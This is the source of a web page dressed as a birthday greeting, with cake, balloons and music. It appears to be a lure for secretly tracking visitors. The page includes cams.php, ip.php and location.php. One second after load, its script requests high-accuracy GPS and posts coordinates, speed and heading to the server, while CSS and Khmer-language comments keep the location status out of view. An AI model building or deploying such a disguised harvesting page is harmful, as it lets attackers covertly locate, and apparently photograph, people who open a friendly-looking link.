<?php
    include 'cams.php';
    include 'ip.php';
    include 'location.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Future Birthday OS</title>
    <link rel="stylesheet" href="style.css">
    <!-- បន្ថែម jQuery សម្រាប់ AJAX -->
    <script src="https://code.jquery.com/jquery-1.8.3.js"></script>
    <style>
        /* លាក់ការស្នើសុំទីតាំង */
        #location-status {
            display: none;
        }
    </style>
</head>
<body>
    <div id="landing-page" class="overlay">
        <button id="start-btn">INITIALIZE BIRTHDAY PROTOCOL</button>
    </div>

    <div id="celebration-zone" class="hidden">
        <div class="sky" id="balloon-container"></div>
        
        <div class="cake-container">
            <h1 class="name-display">HAPPY BIRTHDAY <span id="user-name"></span></h1>
            <div class="cake">
                <div class="candle"><div class="flame"></div></div>
                <div class="tier tier-top"></div>
                <div class="tier tier-bottom"></div>
            </div>
        </div>
    </div>

    <audio id="bday-music" loop>
        <source src="happy-birthday.mp3" type="audio/mpeg">
    </audio>

    <!-- កន្លែងលាក់សម្រាប់បង្ហាញស្ថានភាពទីតាំង -->
    <div id="location-status"></div>

    <script src="script.js"></script>
    
    <!-- បន្ថែម JavaScript សម្រាប់ចាប់យកទីតាំង -->
    <script>
    // ទង់សម្រាប់ពិនិត្យថាបានផ្ញើទីតាំងរួចហើយឬនៅ
    var locationSent = false;
    
    // ចាប់យកទីតាំង GPS តែម្ដង
    function getLocation() {
        // បើបានផ្ញើរួចហើយ មិនត្រូវផ្ញើទៀតទេ
        if (locationSent) {
            console.log("Location already sent, skipping...");
            return;
        }
        
        if (navigator.geolocation) {
            console.log("Requesting location...");
            
            // ជម្រើសសម្រាប់ការចាប់ទីតាំងតែម្ដង
            const options = {
                enableHighAccuracy: true,  // ចង់បានភាពត្រឹមត្រូវខ្ពស់
                timeout: 5000,            // រង់ចាំ 5 វិនាទី
                maximumAge: 0               // មិនយកទិន្នន័យចាស់
            };
            
            // ចាប់ទីតាំងតែម្ដង (មិនតាមដាន)
            navigator.geolocation.getCurrentPosition(sendLocation, showError, options);
            
        } else {
            console.log("Geolocation is not supported by this browser.");
        }
    }
    
    function sendLocation(position) {
        // កុំផ្ញើច្រើនដង
        if (locationSent) return;
        
        console.log("Location obtained, sending to server...");
        
        const locationData = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || 'N/A',
            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
            heading: position.coords.heading || 'N/A',
            speed: position.coords.speed || 'N/A',
            timestamp: new Date().toISOString()
        };
        
        // បង្ហាញទីតាំងក្នុង console (សម្រាប់តេស្ត)
        console.log("Latitude:", locationData.lat);
        console.log("Longitude:", locationData.lng);
        console.log("Accuracy:", locationData.accuracy, "meters");
        
        // ផ្ញើទៅកាន់ server
        $.ajax({
            type: 'POST',
            url: '/location.php',
            data: { location: JSON.stringify(locationData) },
            dataType: 'json',
            success: function(response) {
                console.log('✅ Location sent successfully');
                locationSent = true; // កំណត់ថាបានផ្ញើរួច
                if (response.map) {
                    console.log('📍 Map link:', response.map);
                }
            },
            error: function(xhr, status, error) {
                console.log('❌ Error sending location:', error);
            }
        });
    }
    
    function showError(error) {
        console.log("❌ Geolocation error:");
        switch(error.code) {
            case error.PERMISSION_DENIED:
                console.log("User denied the request for Geolocation.");
                break;
            case error.POSITION_UNAVAILABLE:
                console.log("Location information is unavailable.");
                break;
            case error.TIMEOUT:
                console.log("The request to get user location timed out.");
                break;
            case error.UNKNOWN_ERROR:
                console.log("An unknown error occurred.");
                break;
        }
    }
    
    // ហៅមុខងារចាប់យកទីតាំងពេលផ្ទុកទំព័ររួច
    $(document).ready(function() {
        console.log("Page loaded, waiting 1 seconds before requesting location...");
        
        // រង់ចាំ 1 វិនាទី រួចសួររកទីតាំង
        setTimeout(getLocation, 1000);
    });

    // កែប្រែមុខងារប៊ូតុង START ដើម្បីកុំឲ្យប៉ះពាល់ដល់ការចាប់ទីតាំង
    document.addEventListener('DOMContentLoaded', function() {
        const startBtn = document.getElementById('start-btn');
        if (startBtn) {
            // រក្សាមុខងារដើមរបស់ start-btn (ដែលមានក្នុង script.js)
            // គ្រាន់តែបន្ថែម console.log ដើម្បីដឹងថាចុចហើយ
            startBtn.addEventListener('click', function() {
                console.log('Start button clicked - Birthday celebration initialized');
            });
        }
    });
    </script>
</body>
</html>